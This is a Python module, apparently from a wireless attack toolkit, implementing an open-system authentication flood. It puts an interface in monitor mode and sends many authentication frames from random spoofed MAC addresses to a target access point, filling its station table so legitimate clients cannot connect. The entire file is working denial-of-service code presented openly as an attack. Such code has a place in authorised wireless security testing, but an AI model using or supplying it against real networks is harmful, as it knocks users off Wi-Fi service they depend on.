"""Open-system authentication flood: exhaust an AP's association table.

Every successful open-system Authentication creates an entry in the AP's
station table pending association; sending many from distinct spoofed
MACs faster than the AP ages stale entries out can fill a resource-
constrained AP's table, blocking real clients from associating at all --
the classic aireplay-ng-style "fake auth flood" DoS, reimplemented
natively here rather than wrapped. Uses frames.py's craft_auth() with
random locally-administered source MACs. Follows attacks/deauth.py's
conventions (monitor-mode self-heal, per-frame stop_event check, one
socket.send() per frame).
"""

from __future__ import annotations

import time

from scapy.config import conf

from ..frames import craft_auth
from ..radio import (
    ensure_channel,
    ensure_monitor_mode,
    get_mode,
    random_locally_administered_mac,
)


def auth_flood(
    iface: str,
    bssid: str,
    count: int = 100,
    channel: int | None = None,
    interval: float = 0.0,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Send count open-system Authentication requests to bssid, each from
    a fresh random locally-administered source MAC.

    stop_event: checked before every frame; a set event aborts the
    remaining count immediately, same contract as attacks/deauth.py.

    Returns the number of frames actually handed to the OS for
    transmission -- 0 if iface isn't in monitor mode.
    """
    log = progress_fn or (lambda msg: None)

    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- auth frames cannot transmit")
        return 0

    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"auth flood socket open failed: {exc}")
        return 0

    sent = 0
    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"auth flood stopped after {sent} frame(s) -- stop requested")
                return sent
            src = random_locally_administered_mac()
            pkt = craft_auth(bssid, src)
            try:
                sock.send(pkt)
                sent += 1
            except OSError as exc:
                log(f"auth flood send failed after {sent} frame(s): {exc}")
                return sent
            log(f"auth request {i + 1}/{count} sent: {src} -> {bssid}")
            if interval and i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
